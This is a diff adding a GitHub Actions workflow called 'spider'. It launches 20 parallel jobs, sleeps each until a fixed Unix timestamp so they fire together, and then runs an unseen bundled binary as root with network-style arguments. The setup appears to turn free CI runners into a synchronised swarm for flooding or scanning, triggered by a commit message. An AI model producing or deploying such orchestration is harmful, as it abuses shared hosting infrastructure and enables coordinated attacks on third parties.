@@ -1,0 +1,28 @@
+# seed
+name: spider
+on:
+  push:
+    branches: [ main, master ]
+  workflow_dispatch:
+
+jobs:
+  spider:
+    if: github.event_name == 'workflow_dispatch' || startsWith(github.event.head_commit.message, 'spider-run')
+    runs-on: ubuntu-24.04
+    timeout-minutes: 12
+    strategy:
+      fail-fast: false
+      matrix:
+        n: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
+    steps:
+    - uses: actions/checkout@v4
+    - name: sync
+      run: |
+        target=1794259561
+        now=$(date +%s)
+        wait=$((target-now))
+        if [ "$wait" -gt 0 ]; then sleep "$wait"; fi
+    - name: run
+      run: |
+        chmod +x ./spider
+        sudo ./spider 0.0.0.0 1 1 1024 vc
